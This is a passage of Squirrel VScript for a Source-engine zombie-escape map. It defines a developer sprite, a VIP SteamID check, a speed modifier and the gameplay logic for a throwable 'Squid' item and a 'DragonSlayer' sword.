		emsg.SetOrigin(spos+Vector(0,0,zofs)+(sdirleft*(patronfeatures[i].text.len()*3.00)));
		emsg.SetForwardVector(sdir);
		emsg.__KeyValueFromString("message",patronfeatures[i].text);
		emsg.__KeyValueFromString("targetname","patronstuff");
		emsg.__KeyValueFromInt("textsize",10);
		emsg.__KeyValueFromVector("color",Vector(50,200,255));
		EntFireByHandle(emsg,"SetParent","spawnplatform",0.00,null,null);
		EntFireByHandle(emsg,"SetParent","spawnplatform",0.05,null,null);
		EntFireByHandle(emsg,"SetParent","spawnplatform",0.55,null,null);
		patronfeatures[i].Spawn(spos,::DirToAngles(sdir)+Vector(0,180,0));
			//DebugDrawBox(spos,Vector(-2,-2,-2),Vector(2,2,60),255,255,255,200,20.00);
	}
	if(::DEVID==null)return;
	local pc = ::GetPlayerClass(::DEVID);
	if(pc==null)return;
	if(pc.handle==null||!pc.handle.IsValid()||pc.handle.IsAlive()==false)return;
	if(pc.handle.GetTeam()!=3&&::MOTHER_ZOMBIE_SPAWNED)return;
	::Ent(pc.handle.GetOrigin()+Vector(0,0,85),Vector(),"env_sprite",{
			spawnflags = 1,
			model = "materials/luffaren/luffaren_sprite.vmt",
			scale = 0.20,
			rendermode = 1,
			targetname = "devsprite",
		},{
		devuser = pc.handle,
		ticking = true,
		function TickCheck(){
			if(!ticking){EntFireByHandle(self,"HideSprite","",0.00,null,null);return;}
			EntFireByHandle(self,"RunScriptCode"," TickCheck(); ",1.00,null,null);
			if(devuser==null||!devuser.IsValid()||devuser.IsAlive()==false)ticking = false;
			else if(::MOTHER_ZOMBIE_SPAWNED && devuser.GetTeam()!=3)ticking = false;
			else if(!::DEVSPRITE)ticking = false;
		},function Run(){
			EntFireByHandle(self,"SetParent","!activator",0.00,devuser,null);
			EntFireByHandle(self,"RunScriptCode"," TickCheck(); ",1.00,null,null);
			local playercount = ::GetPlayerCount();
			if(playercount < 2)EntFireByHandle(self,"HideSprite","",0.00,null,null);
			else EntFireByHandle(self,"ShowSprite","",0.00,null,null);
		}});
}
::IsVIP<-function(playerhandle)
{
	if(playerhandle==null||!playerhandle.IsValid())return null;
	local pc = ::GetPlayerClass(playerhandle);
	if(pc==null)return false;
	if(pc.steamid==null||pc.steamid=="")return false;
	foreach(v in ::VIPS){if(::MatchingSteamID(pc.steamid,v))return true;}
	return false;
}

function AddSpeed(speedadd,time=null){
	if(activator==null||!activator.IsValid())return;
	if(speedadd == 0.00)return;
	activator.ValidateScriptScope();
	if(!("speedmod" in activator.GetScriptScope()))
		activator.GetScriptScope().speedmod <- 1.00;
			//printl("[AddSpeed] player:"+activator+"   speedadd:"+speedadd+"   speedmod:"+activator.GetScriptScope().speedmod+"   time:"+time);
	if(time!=null)
	{
		if(time<=0.00)return;
		EntFire("manager","RunScriptCode"," AddSpeed("+(-speedadd).tostring()+",null); ",time,activator);
	}
	local is_negative = false;
	if(activator.GetScriptScope().speedmod<=0.00)is_negative=true;
	activator.GetScriptScope().speedmod += speedadd;
	local speedmodset = (0.00+activator.GetScriptScope().speedmod);
	if(speedmodset<0.01)
	{
		if(is_negative)return;
		speedmodset=0.01;
	}
	EntFire("speedmod","ModifySpeed",speedmodset.tostring(),0.00,activator);}
	dtrange <- scandt;

::ITEMS <- {//::Ent(pos,rot,classname,keyvalues,script);			//hammerid-range used:	2 - 29
	//xxxxxxxxxxx = {
	//		team = 3,			//2:T 3:CT
	//		hammerid = null,	//example: 1 (range 1-999)
	//	function Spawn(pos){
	//		//WITHIN ::ENT-Initialize()-logic:
	//			//::CreateCostCleaner(button,3);	//2 for infinite-use(button+visual), 3 for one-time-use(button+visual+holder, kill holder on-drop after use)
	//			//::CreateTemCleaner(holder,{holder=holder,function Clean(){EntFireByHandle(holder,"Kill","",0.00,null,null);}});
	//			//within ::ENT-Use()-logic (if needed):				if(!::MOTHER_ZOMBIE_SPAWNED)return;
	//	}
	//},
	squid = {
			team = 2,
			hammerid = 31,	//example: 1 (range 1-999)
			cooldown = 10.00,
			uses = 1,
			tickrate = 0.01,
			gravity = 0.50,
			throw_force = 1000,
			lifetime = 15.00,
			hit_radius = 250,
			directhit_damage = 69,		//damage dealt to a single CT if it hits directly
			overlay_time = 10.00,		//this time also prevents human items from being used
			slow_time = 10.00,
			slow_amount = -0.40,
			pitch_offset = -3.00,
		function Spawn(pos){
			//::CreateItem(pos,Vector(),3,"Squid","("+cooldown.tostring()+"s|"+uses.tostring()+"x)\nThrow a squid that inks on floor-impact"+
			::CreateItem(pos,Vector(),3,"Squid","("+uses.tostring()+"x)\nThrow a squid that inks on floor-impact"+
				"\nIt throws towards your look-direction\nIt can also bounce on walls\nBlinds and slows nearby humans from the impact"+
				"\nInked humans ("+overlay_time.tostring()+"s) can't use items",{
				model = null,
				uses = (0+::ITEMS.squid.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/squid.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-36),button.GetAngles()+Vector(0,270,90),"prop_dynamic",{
								model="models/luffaren/squid.mdl",
								modelscale = 0.55,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Tick(){
								EntFireByHandle(self,"RunScriptCode","Tick()",RandomFloat(0.40,30.00),null,null);
								if(button.GetMoveParent().GetMoveParent()==null)return;
								::Sound("*luffaren/squid_idle.mp3",Vector(),button,2000,1.20,RandomInt(95,100),10);
							},function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.01,null,null);
								EntFireByHandle(self,"RunScriptCode","Tick()",0.50,null,null);
							}});
					}
					else if(event==2)//pickup
					{
						EntFireByHandle(user,"AddOutput","health "+::Z_ITEM_HP.tostring(),0.00,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+::ITEMS.squid.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 150",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								::ITEMS.squid.SpawnSquid(player.EyePosition(),rot+Vector(::ITEMS.squid.pitch_offset,0,0),player);
							}});
						return;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function PlayerInked(player){
			if(player==null||!player.IsValid())return false;
			player.ValidateScriptScope();
			if(!("squid_inked" in player.GetScriptScope()))
				player.GetScriptScope().squid_inked <- 0;
			if(player.GetScriptScope().squid_inked > 0)
				return true;
			return false;
		},
		function SpawnSquid(pos,rot,user=null)
		{
			//::manager.PrecacheModel("models/luffaren/squid.mdl");
			::Ent(pos,rot,"hegrenade_projectile",{},{
				ticking = true,
				exploded = false,
				going_down = false,
				sound = null,
				user = user,
				function Explode(){
					if(exploded)return;
					exploded = true;
					ticking = false;
					EntFireByHandle(self,"Kill","",0.05,null,null);
					if(sound==null||!sound.IsValid()){}else
					{
						EntFireByHandle(sound,"StopSound","",0.00,null,null);
						EntFireByHandle(sound,"Volume","0",0.00,null,null);
						EntFireByHandle(sound,"Kill","0",0.10,null,null);
					}
					::Sound("*luffaren/squish.mp3",self.GetOrigin(),null,5000,0.10,RandomInt(70,100),10);
					::Sound("*luffaren/squish.mp3",self.GetOrigin(),null,2500,0.10,RandomInt(150,160),10);
					::Sound("*luffaren/squid_impact.mp3",self.GetOrigin(),null,10000,0.10,RandomInt(95,100),10);
					for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::ITEMS.squid.hit_radius);)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						local vel = h.GetVelocity();
						vel.x = 0;
						vel.y = 0;
						if(vel.z>0)vel.z = 0;
						h.SetVelocity(vel);
						EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.squid.slow_amount.tostring()+","+::ITEMS.squid.slow_time.tostring()+"); ",0.00,h);
						for(local ii=0.00;ii<::ITEMS.squid.overlay_time;ii+=0.40){EntFire("client","Command","r_screenoverlay luffaren/squid_ink",ii,h);}
						EntFire("client","Command","r_screenoverlay XXX_NULL_XXX",::ITEMS.squid.overlay_time+0.02,h);
						EntFire("client","Command","r_screenoverlay ",::ITEMS.squid.overlay_time+0.05,h);
						EntFire("client","Command","r_screenoverlay ",::ITEMS.squid.overlay_time+0.10,h);
						::NullifyFalldownCheckpoint(h,user,20,0.40);		//20*0.40 = 8s (matches ink-time for v1_7)
						::Sound("*luffaren/squish.mp3",Vector(),h,-1,1.00,100,10);
						h.ValidateScriptScope();
						if(!("squid_inked" in h.GetScriptScope()))
							h.GetScriptScope().squid_inked <- 0;
						h.GetScriptScope().squid_inked++;
						EntFireByHandle(h,"RunScriptCode","squid_inked--;",::ITEMS.squid.overlay_time,null,null);
					}
					for(local i=0;i<5;i++)
						::Ent(self.GetOrigin(),Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360)),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = (0.01),
								rendermode = 3,
								renderamt = 255,
								rendercolor = "0 0 0",
								glowenabled = 1,
								glowdist = 5000,
								glowstyle = 1,
								glowcolor = "20 0 10",
							},{
							master = self,
							ticking = true,
							scale = (0.01),
							scaletarget = 3.00,
							i = i,
							function Tick(){
								if(!ticking)
								{
									EntFireByHandle(self,"Kill","",0.00,null,null);
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
								scale += RandomFloat(0.05,0.50);
								//self.__KeyValueFromFloat("modelscale",scale);
								::NetProps.SetPropFloat(self,"m_flModelScale",scale);
								if(scale>=scaletarget)ticking = false;
							},function Run(){
								scaletarget = RandomFloat(0.10,2.50);
								if(i==0)scaletarget=2.50;
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.00,null,null);
							}});
				},function Tick(){
					if(!ticking){Explode();return;}
					EntFireByHandle(self,"RunScriptCode","Tick();",::ITEMS.squid.tickrate,null,null);
					if(self.GetVelocity().z<0)going_down = true;
					if(self.GetVelocity().Length() < 3.50 || going_down && self.GetVelocity().z > 0)
					{
						ticking = false;
						return;
					}
					local xyvel = Vector(self.GetVelocity().x,self.GetVelocity().y,0);
					if(xyvel.Length() < 0.50)return;
					local mdir = self.GetVelocity();
					mdir.Norm();
					self.SetForwardVector(mdir);
					self.SetAngles(self.GetAngles().x+90,self.GetAngles().y,self.GetAngles().z);
				},function Run(){
					self.SetModel("models/luffaren/squid.mdl");
					self.SetCollisionGroup(1);
					self.SetSize(Vector(-10,-10,-30),Vector(10,10,30));
					self.SetSolid(3);
					
					self.SetVelocity(::AnglesToDir(self.GetAngles())*::ITEMS.squid.throw_force);
					self.SetForwardVector(::AnglesToDir(self.GetAngles()+Vector(90,0,0)));
					EntFireByHandle(self,"RunScriptCode","ticking=false;",::ITEMS.squid.lifetime,null,null);
					EntFireByHandle(self,"RunScriptCode","Tick();",0.05,null,null);
					EntFireByHandle(self,"AddOutput","modelscale 2.00",0.00,null,null);
					EntFireByHandle(self,"AddOutput","gravity "+::ITEMS.squid.gravity.tostring(),0.00,null,null);
					EntFireByHandle(self,"AddOutput","material 3",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(1);",0.00,null,null);
					//EntFireByHandle(self,"AddOutput","friction 500",0.00,null,null);
						//EntFireByHandle(self,"AddOutput","movetype 3",0.02,null,null);
						//self.SetSize(Vector(-5,-5,-5),Vector(5,5,5));
					::Sound("*luffaren/squid_fly.mp3",Vector(),self,50000,6.00,RandomInt(95,100),10,{
						master=self,function Run(){master.GetScriptScope().sound=soundhandle;}});
					::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_ct",
						},{
						master = self,
						user = user,
						touched = false,
						function Touch(){
							if(touched)return;
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false||toucher.GetTeam()!=3)return;
							touched = true;
							master.GetScriptScope().ticking = false;
							master.GetScriptScope().Explode();
							::HurtPlayer(toucher,::ITEMS.squid.directhit_damage,self.GetOrigin(),RandomInt(200,300),user,"squid");
						},function Run(){
							if(master==null||!master.IsValid()){
								EntFireByHandle(self,"Kill","",0.00,null,null);
								return;}
							EntFireByHandle(self,"AddOutput","mins -10 -10 -30",0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs 10 10 30",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
								//EntFireByHandle(self,"RunScriptCode",
								//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
								//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
						}});
				}});
		}
	},
	dragonslayer = {
			team = 3,
			hammerid = 30,	//example: 1 (range 1-999)
	 		tickrate = 0.30,
			cooldown_side = 0.45,
			cooldown_down = 1.00,
			bloodstack_start = 0.00,			//0.00 - 4.00+	(0:clean, 1:slightly bloody, 4:max bloody)
			bloodstack_add_min = 0.01,
			bloodstack_add_max = 0.05,
			slowdown_stackmult = 0.075,			//bloodstack (int at 0-4) * this value = slowamount
			downslash_vel = 20,					//fall-velocity required to allow downslash attack
			animreset_time = 5.00,
			bosshit = [500,2500,1.50,2.00],		//radius,damage,stunchance,stuntime_add		(SWIPE)
			bosshit_ds = [500,10000,5.00,5.00],	//radius,damage,stunchance,stuntime_add		(DOWNSLASH)
			hp_use_limit = 5,
			selfhurt_swipe = 3,
			selfhurt_downslash = 9,
			slowdown_swipe = -0.30,
			slowdown_downslash = -0.50,
			slowtime_swipe = 0.60,
			slowtime_downslash = 0.80,
			hitdamage_swipe = 666,
			hitdamage_downslash = 6666,
			hitslow_swipe_amount = -0.25,
			hitslow_swipe_time = 0.60,
			hitslow_downslash_amount = -0.80,
			hitslow_downslash_time = 0.80,
			hitdamage_firemult = 2.00,
			hitdamage_fireignite = 5.00,		//null:ignore
			hitbox_range = 250,
			hitbox_damage = 1000,
			hitvel_xy = 500,					//for downslash only
			hitvel_z = 300,						//for downslash only
			watercrystal_range = 400,
			watercrystal_set = -3.00,			//bloodstack value to set
			firecrystal_range = 400,
			firecrystal_time_add = 30.00,		//fire-buff-time to +=
			fx_trail = true,
			fx_limit = 10,
		fxamt = 0,
		function Spawn(pos){
			
			
			local desc = "(0s)\nUse while falling to downslash"+
					"\nUsing it puts a strain on your body"+
					"\nCannot be used while weak (<"+hp_use_limit.tostring()+"hp)"+
					"\nBlood-buildup makes it heavier to wield"+
					"\nWaterCrystal clears the blood"+
					"\nFireCrystal buffs it temporarily";
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			local desc = "(0s)\nIt was too big to be called a sword...";
				try{local pc=::GetPlayerClass("STEAM_1:1:61677332");if(pc!=null){
				if(pc.handle==null||!pc.handle.IsValid()){}else desc=desc+"\nSmithed to bust papaJ's 'sizable' testicles";
				}}catch(e);
			desc = desc + "\nUse it while falling to downslash"+
					"\nUsing it puts a strain on your body"+
					"\nYou cannot use it while too weak (<"+hp_use_limit.tostring()+"hp)"+
					"\nBlood-buildup makes it heavier to wield"+
					"\nWaterCrystal can wash the blood off"+
					"\nFireCrystal can make it temporarily stronger";
			*/
			
			
			::CreateItem(pos,Vector(),1,"DragonSlayer",desc,{
				cooldown_side = cooldown_side,
				cooldown_down = cooldown_down,
				model=null,
				animstate = 0,
				bloodstack = (0.00+bloodstack_start),
				firestate = 0.00,
				lastowner = null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/berserker_sword.mdl");
						::Ent(button.GetOrigin()-(button.GetForwardVector()*10)+(button.GetRightVector()*10)+Vector(0,0,-90),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/berserker_sword.mdl",
								rendermode = 1,
								modelscale = 1.80,
								glowenabled = 0,
								glowdist = 2000,
								glowstyle = 1,
								glowcolor = "80 30 0",
							},{
							button = button,
							logic = this,
							idleanim_buffer = -9999.00,
							function Tick(){
								EntFireByHandle(self,"RunScriptCode","Tick();",::ITEMS.dragonslayer.tickrate,null,null);
								local bstack = 0.00+logic.bloodstack;bstack=bstack.tointeger();if(bstack<0)bstack=0;else if(bstack>4)bstack=4;
								EntFireByHandle(self,"AddOutput","skin "+bstack.tostring(),0.00,null,null);
								if(bstack>0&&button.GetMoveParent().GetMoveParent()!=null)
									EntFire("manager","RunScriptCode"," AddSpeed("+(-((0.00+bstack)*::ITEMS.dragonslayer.slowdown_stackmult)).tostring()+","+
										(::ITEMS.dragonslayer.tickrate-0.02).tostring()+"); ",0.00,button.GetMoveParent().GetMoveParent());
								
								
								if(logic.firestate>0.00){logic.firestate-=::ITEMS.dragonslayer.tickrate;EntFireByHandle(self,"AddOutput","rendercolor 255 200 50",0.00,null,null);}
								else{logic.firestate=0.00;EntFireByHandle(self,"AddOutput","rendercolor 255 255 255",0.00,null,null);}
									//__CSS__ dragonslayer firecrystal buff glow - no glow in CSS though..   (old below, new above)
								//if(logic.firestate>0.00){logic.firestate-=::ITEMS.dragonslayer.tickrate;EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);}
								//else{logic.firestate=0.00;EntFireByHandle(self,"AddOutput","glowenabled 0",0.00,null,null);}
								
								
								try{
								if(button.GetMoveParent().GetMoveParent()!=null)logic.lastowner = button.GetMoveParent().GetMoveParent();
								if(logic.lastowner==null||!logic.lastowner.IsValid())logic.lastowner=null;
								else
								{
									if(::MOTHER_ZOMBIE_SPAWNED && logic.lastowner.GetTeam()!=3 || logic.lastowner.IsAlive()==false)
									{
										logic.lastowner=null;
										::Sound("*luffaren/berserker_sword_death.mp3",Vector(),button,20000,6.00,100,10);
									}
									else if(button.GetMoveParent().GetMoveParent()==null)logic.lastowner=null;
								}}catch(e){}
								if(idleanim_buffer > -999.00)
								{
									idleanim_buffer -= ::ITEMS.dragonslayer.tickrate;
									if(idleanim_buffer <= 0.00)
									{
										idleanim_buffer = -9999.00;
										if(logic.animstate==1)EntFireByHandle(self,"SetAnimation","reset_L",0.00,null,null);
										else EntFireByHandle(self,"SetAnimation","reset_R",0.00,null,null);
										EntFireByHandle(self,"SetDefaultAnimation","idle",0.01,null,null);
									}
								}
							},function TrailFX(ang,downward=false){
								local pos = Vector();local rot = Vector();
								if(!downward){pos = self.GetOrigin()+Vector(0,0,50)+(::AnglesToDir(::DirToAngles(self.GetForwardVector())+Vector(0,ang,0))*60);
									rot = Vector(0,self.GetAngles().y+ang,0);}
								else{pos = self.GetOrigin()+Vector(0,0,50)+(::AnglesToDir(::DirToAngles(self.GetForwardVector())+Vector(ang,0,0))*60);
									rot = Vector(self.GetAngles().x+ang,self.GetAngles().y,90);}
								
								
								local rcolor = "255 255 255";
								local ralpha = 100;
								if(logic.firestate > 0.00){rcolor = "255 225 50";ralpha=210;}
									//__CSS__ dragonslayer firecrystal buff glow - no glow in CSS though..   (old below, new above)
								//local glow = 0;
								//if(logic.firestate > 0.00)glow = 1;
								
								::Ent(pos,rot,"prop_dynamic",{model="models/luffaren/berserker_sword.mdl",rendermode=1,modelscale=2.50,
										
										
										renderamt = ralpha,
										rendercolor = rcolor,	
												//__CSS__ dragonslayer firecrystal buff glow - no glow in CSS though..   (old below, new above)
										//renderamt = 70,
										//rendercolor = "255 255 255 70",	
										//glowenabled = glow, 
										//glowcolor = "100 20 0", 
										//glowdist = 10000, 
										//glowstyle = 1,
									
									},{
									ralpha = ralpha,
									function Run(){local ii = 0.00;
										
										local alphd = 5;
										if(this.ralpha==210)alphd = 10;
										
										//for(local alpha=70;alpha>0;alpha-=5)	//__CSS__ og
										for(local alpha=0+this.ralpha;alpha>0;alpha-=alphd)	//__CSS__ new
										
										{EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
										ii+=0.01;}EntFireByHandle(self,"Kill","",ii,null,null);}});
							},function HitCheck(swipe=true){
								local dmgmult=1.00;if(logic.firestate > 0.00)dmgmult=(0.00+::ITEMS.dragonslayer.hitdamage_firemult);
								for(local h;h=Entities.FindByNameWithin(h,"hitbox*",self.GetOrigin()+(self.GetForwardVector()*150),::ITEMS.dragonslayer.hitbox_range);)
									{EntFireByHandle(h,"RemoveHealth",::ITEMS.dragonslayer.hitbox_damage.tostring(),0.00,null,null);}
								if(swipe)::HurtStunBoss(self.GetOrigin()+(self.GetForwardVector()*150),
									::ITEMS.dragonslayer.bosshit[0]*dmgmult,::ITEMS.dragonslayer.bosshit[1]*dmgmult,
									::ITEMS.dragonslayer.bosshit[2]*dmgmult,::ITEMS.dragonslayer.bosshit[3]*dmgmult,null,false,true);
								else ::HurtStunBoss(self.GetOrigin()+(self.GetForwardVector()*150),
									::ITEMS.dragonslayer.bosshit_ds[0]*dmgmult,::ITEMS.dragonslayer.bosshit_ds[1]*dmgmult,
									::ITEMS.dragonslayer.bosshit_ds[2]*dmgmult,::ITEMS.dragonslayer.bosshit_ds[3]*dmgmult,null,false,true);
								
								
								
								
								
								//__CSS__ OOB trigger rotation is fucked (replacement logic):
								local slash_mins = Vector(-30,-20,-100);
								local slash_maxs = Vector(370,20,250);
								if(swipe){slash_mins = Vector(-50,-200,65);slash_maxs = Vector(370,200,75);}
								::TriggerScan(self.GetOrigin(),self.GetAngles(),slash_mins,slash_maxs,
									"filter_non_invincible_t",{
									button = button,
									model = self,
									logic = logic,
									swipe = swipe,
									function Touch(toucher){
										if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
										toucher.ValidateScriptScope();
										if("invincible" in toucher.GetScriptScope())return;
										logic.bloodstack += RandomFloat(::ITEMS.dragonslayer.bloodstack_add_min,::ITEMS.dragonslayer.bloodstack_add_max);
										local newhp = toucher.GetHealth();
										local dmgmult=1.00;
										if(logic.firestate > 0.00)
										{
											dmgmult=(0.00+::ITEMS.dragonslayer.hitdamage_firemult);
											if(::ITEMS.dragonslayer.hitdamage_fireignite!=null)
												EntFireByHandle(toucher,"IgniteLifeTime",::ITEMS.dragonslayer.hitdamage_fireignite.tostring(),0.00,null,null);
										}
										
										dmgmult *= ::HURTPLAYER_mult_t;
										
										local newvel = toucher.GetVelocity();
										if(this.swipe)
										{
											newhp-=(::ITEMS.dragonslayer.hitdamage_swipe*dmgmult);
											newvel.x = 0.00;
											newvel.y = 0.00;
											if(newvel.z > 0)newvel.z = 0.00;
										}
										else
										{
											newhp-=(::ITEMS.dragonslayer.hitdamage_downslash*dmgmult);
											local zvel = (0.00+::ITEMS.dragonslayer.hitvel_z);
											if(newvel.z > 10)zvel = 0.00;
											newvel = (this.model.GetForwardVector()*::ITEMS.dragonslayer.hitvel_xy)+Vector(0,0,zvel);
										}
										if(newhp <= 0)::HurtPlayer(toucher,999999,this.model.GetOrigin(),RandomInt(200,400),
											button.GetMoveParent().GetMoveParent(),"dragonslayer");
										else
										{
											toucher.SetHealth(newhp);
											toucher.SetVelocity(newvel);
											if(this.swipe)
												EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.hitslow_swipe_amount.tostring()+
													","+::ITEMS.dragonslayer.hitslow_swipe_time.tostring()+"); ",0.00,toucher);
											else
												EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.hitslow_downslash_amount.tostring()+
													","+::ITEMS.dragonslayer.hitslow_downslash_time.tostring()+"); ",0.00,toucher);
										}
										if(::ITEMS.dragonslayer.fxamt>::ITEMS.dragonslayer.fx_limit)return;
										::ITEMS.dragonslayer.fxamt++;
										EntFire("manager","RunScriptCode"," ::ITEMS.dragonslayer.fxamt--; ",0.05,null);
										local fxtime = RandomFloat(0.00,0.20);
										if(!this.swipe)fxtime = RandomFloat(0.00,0.03);
										EntFireByHandle(toucher,"RunScriptCode",
											"::Particle(\"blood_advisor_puncture_withdraw\",self.GetOrigin()+Vector(0,0,40),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.03);",
											fxtime,null,null);
										EntFireByHandle(toucher,"RunScriptCode",
											"::Sound(\"*luffaren/sliced.mp3\",self.GetOrigin()+Vector(0,0,40),null,10000,0.02,RandomInt(70,90),10);",fxtime,null,null);
										if(!this.swipe)EntFireByHandle(toucher,"RunScriptCode",
											"::Sound(\"*luffaren/sliced.mp3\",self.GetOrigin()+Vector(0,0,40),null,10000,0.02,RandomInt(90,110),10);",fxtime,null,null);
									},function Scanned(list){foreach(h in list){Touch(h);}}},false);
								
								
								
								
								
								//__CSS__ OOB trigger rotation is fucked (old logic):
								/*
								::Ent(self.GetOrigin()+Vector(0,0,50),self.GetAngles(),"trigger_multiple",{
										spawnflags = 1,
										filtername = "filter_non_invincible_t",
									},{
									button = button,
									model = self,
									logic = logic,
									swipe = swipe,
									function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
										toucher.ValidateScriptScope();
										if("invincible" in toucher.GetScriptScope())return;
										logic.bloodstack += RandomFloat(::ITEMS.dragonslayer.bloodstack_add_min,::ITEMS.dragonslayer.bloodstack_add_max);
										local newhp = toucher.GetHealth();
										local dmgmult=1.00;
										if(logic.firestate > 0.00)
										{
											dmgmult=(0.00+::ITEMS.dragonslayer.hitdamage_firemult);
											if(::ITEMS.dragonslayer.hitdamage_fireignite!=null)
												EntFireByHandle(toucher,"IgniteLifeTime",::ITEMS.dragonslayer.hitdamage_fireignite.tostring(),0.00,null,null);
										}
										local newvel = toucher.GetVelocity();
										if(swipe)
										{
											newhp-=(::ITEMS.dragonslayer.hitdamage_swipe*dmgmult);
											newvel.x = 0.00;
											newvel.y = 0.00;
											if(newvel.z > 0)newvel.z = 0.00;
										}
										else
										{
											newhp-=(::ITEMS.dragonslayer.hitdamage_downslash*dmgmult);
											local zvel = (0.00+::ITEMS.dragonslayer.hitvel_z);
											if(newvel.z > 10)zvel = 0.00;
											newvel = (self.GetForwardVector()*::ITEMS.dragonslayer.hitvel_xy)+Vector(0,0,zvel);
										}
										if(newhp <= 0)::HurtPlayer(toucher,999999,self.GetOrigin(),RandomInt(200,400),button.GetMoveParent().GetMoveParent(),"dragonslayer");
										else
										{
											toucher.SetHealth(newhp);
											toucher.SetVelocity(newvel);
											if(swipe)
												EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.hitslow_swipe_amount.tostring()+
													","+::ITEMS.dragonslayer.hitslow_swipe_time.tostring()+"); ",0.00,toucher);
											else
												EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.hitslow_downslash_amount.tostring()+
													","+::ITEMS.dragonslayer.hitslow_downslash_time.tostring()+"); ",0.00,toucher);
										}
										if(::ITEMS.dragonslayer.fxamt>::ITEMS.dragonslayer.fx_limit)return;
										::ITEMS.dragonslayer.fxamt++;
										EntFire("manager","RunScriptCode"," ::ITEMS.dragonslayer.fxamt--; ",0.05,null);
										local fxtime = RandomFloat(0.00,0.20);
										if(!swipe)fxtime = RandomFloat(0.00,0.03);
										EntFireByHandle(toucher,"RunScriptCode",
											"::Particle(\"blood_advisor_puncture_withdraw\",self.GetOrigin()+Vector(0,0,40),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.03);",
											fxtime,null,null);
										EntFireByHandle(toucher,"RunScriptCode",
											"::Sound(\"*luffaren/sliced.mp3\",self.GetOrigin()+Vector(0,0,40),null,10000,0.02,RandomInt(70,90),10);",fxtime,null,null);
										if(!swipe)EntFireByHandle(toucher,"RunScriptCode",
											"::Sound(\"*luffaren/sliced.mp3\",self.GetOrigin()+Vector(0,0,40),null,10000,0.02,RandomInt(90,110),10);",fxtime,null,null);
									},function Run(){
											//DRAGONSLAYER_TRIGGER_SIZES
										if(swipe)
										{
												//OLD:
											//EntFireByHandle(self,"AddOutput","mins -50 -170 -30",0.00,null,null);
											//EntFireByHandle(self,"AddOutput","maxs 320 170 30",0.00,null,null);
												//NEW v1_9:
											EntFireByHandle(self,"AddOutput","mins -50 -200 -40",0.00,null,null);
											EntFireByHandle(self,"AddOutput","maxs 400 200 30",0.00,null,null);
										}
										else
										{
												//OLD:
											//EntFireByHandle(self,"AddOutput","mins -30 -6 -30",0.00,null,null);
											//EntFireByHandle(self,"AddOutput","maxs 320 6 200",0.00,null,null);
												//NEW v1_9:
											EntFireByHandle(self,"AddOutput","mins -30 -20 -100",0.00,null,null);
											EntFireByHandle(self,"AddOutput","maxs 400 20 250",0.00,null,null);
										}
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"Enable","",0.02,null,null);
